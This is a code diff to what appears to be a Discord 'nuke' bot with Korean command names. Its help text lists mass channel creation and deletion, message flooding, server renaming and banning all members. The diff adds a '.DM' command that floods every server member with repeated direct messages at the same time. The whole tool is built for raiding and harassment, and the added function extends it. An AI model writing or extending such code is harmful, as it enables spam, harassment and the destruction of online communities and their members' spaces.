@@ -50,7 +50,7 @@ async def on_ready():
     ascii_art = r"""
  _____ _____ _____ _____ _____ __        __ __     _____ 
 |  |  |   __| __  |   | |   __|  |   ___|  |  |   |  _  |
-|  --|   __|  --| | | |   __|  |__|___|-   -|   |  __ |
+|  --|   __|  --| | | |   __|  |__|___|-   -|  |   |  __ |
 |__|__|_____|__|__|_|___|_____|_____|   |__|__|   |__|  
 
 ------------------------------------------------------------"""
@@ -74,6 +74,7 @@ async def show_help(ctx):
         ".채널생성 (개수) (채널 이름)\n"
         ".채널삭제 (모든 채널 삭제)\n"
         ".메시지도배 (채널당 개수) (메시지)\n"
+        ".DM (횟수) (메시지)\n"
         ".서버이름변경 (새로운 서버 이름)\n"
         ".올밴 (서버 전체 인원 밴)\n"
         "```"
@@ -121,12 +122,43 @@ async def spam_messages(ctx, count: int, *, message_text: str):
     total_sent = sum(results)
     log(f"[COMPLETE] Message spamming completed: Total {total_sent} messages sent")
 
+async def send_dm_to_member(member, count, message_text):
+    if member.bot:
+        return 0
+    
+    success_count = 0
+    for i in range(count):
+        try:
+            await member.send(message_text)
+            log(f"[SUCCESS] DM sent to {member} ({i + 1}/{count})")
+            success_count += 1
+            await asyncio.sleep(0.1)
+        except Exception as e:
+            log(f"[FAILED] DM failed for {member} - Reason: {e}")
+            break  # DM이 차단된 경우 반복 중단
+    return success_count
+
+@bot.command(name="DM")
+async def send_dm_all(ctx, count: int, *, message_text: str):
+    await delete_trigger_message(ctx)
+    if count <= 0:
+        log(f"[WARN] 잘못된 수량 입력: {count}")
+        return
+
+    guild = ctx.guild
+    members = guild.members
+    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | DM spamming requested ({count} times per member, total {len(members)} members)")
+
+    tasks = [send_dm_to_member(m, count, message_text) for m in members]
+    results = await asyncio.gather(*tasks)
+    total_sent = sum(results)
+    log(f"[COMPLETE] DM spamming completed: Total {total_sent} DMs sent")
+
 @bot.command(name="서버이름변경")
 @commands.has_permissions(manage_guild=True)
 async def change_server_name(ctx, *, new_name: str = None):
     await delete_trigger_message(ctx)
     
-    # 입력 인자 검증
     if not new_name:
         log("[WARN] You did not enter a server name. To connect: .server_rename [new_name]")
         return
@@ -225,6 +257,7 @@ async def delete_all_channels(ctx):
 
 @show_help.error
 @spam_messages.error
+@send_dm_all.error
 @ban_all_members.error
 @change_server_name.error
 @create_channels.error
